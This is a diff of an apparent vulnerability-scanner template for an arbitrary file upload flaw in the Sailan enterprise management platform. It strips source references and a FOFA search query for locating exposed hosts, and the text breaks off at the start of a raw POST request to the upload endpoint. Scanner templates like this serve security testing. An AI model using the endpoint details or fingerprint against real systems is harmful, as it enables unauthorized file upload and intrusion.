@@ -3,12 +3,8 @@ info:
   name: 赛蓝企业管理平台System_FocusList 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/boci3a3gk98kfg92'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: boci3a3gk98kfg92
-    fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
 http:
 - raw:
   - 'POST /SystemModule/System_FocusList/SubmitUploadify?FolderId=1&UserId=1 HTTP/1.1
